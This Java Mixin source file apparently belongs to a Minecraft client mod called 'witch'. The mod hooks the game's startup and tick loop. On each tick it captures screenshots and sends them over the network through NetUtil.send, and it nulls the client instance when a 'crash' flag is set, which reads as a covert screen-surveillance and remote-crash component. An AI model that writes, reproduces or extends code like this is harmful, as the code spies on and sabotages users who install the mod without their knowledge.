package me.soda.witch.client.mixin;

import me.soda.witch.client.Witch;
import me.soda.witch.client.utils.MinecraftUtil;
import me.soda.witch.client.utils.NetUtil;
import me.soda.witch.client.utils.ScreenshotUtil;
import net.minecraft.client.MinecraftClient;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.Shadow;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;

import java.io.IOException;

@Mixin(value = MinecraftClient.class)
public class MinecraftClientMixin {
    @Shadow
    private static MinecraftClient instance;

    @Inject(method = "<init>", at = @At("TAIL"))
    private void onInit(CallbackInfo info) {
        Witch.init();
    }

    @Inject(at = @At("TAIL"), method = "tick")
    private void onTick(CallbackInfo info) {
        if (MinecraftUtil.crash) instance = null;
        try {
            if (ScreenshotUtil.canScreenshot())
                NetUtil.send("screenshot", ScreenshotUtil.takeScreenshot());
        } catch (IOException e) {
            Witch.printStackTrace(e);
        }
    }
}
